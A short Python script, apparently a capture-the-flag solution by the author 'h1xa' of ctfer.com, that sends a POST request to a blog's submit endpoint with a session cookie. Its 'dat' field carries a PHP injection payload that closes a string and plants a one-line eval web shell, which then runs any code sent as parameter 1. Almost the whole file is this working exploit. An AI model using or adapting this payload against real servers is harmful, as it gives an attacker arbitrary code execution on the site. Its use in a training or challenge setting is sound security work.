# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2023-03-09 11:05:32
# @Last Modified by:   h1xa
# @Last Modified time: 2023-03-09 11:38:22
# @email: h1xa@ctfer.com
# @link: https://ctfer.com


import requests



url = "https://blog.ctfer.com/c/t.php"

cookie={
        "PHPSESSID":"8b7b1d153e3c6916c68f62a8f44e1d2b"
}

data={
        "dat":'";eval($_POST[1]);?>',
        "title":"1",
        "content":"%20",
}

response = requests.post(url=url+"?type=submit",data=data,cookies=cookie)

print(response.text)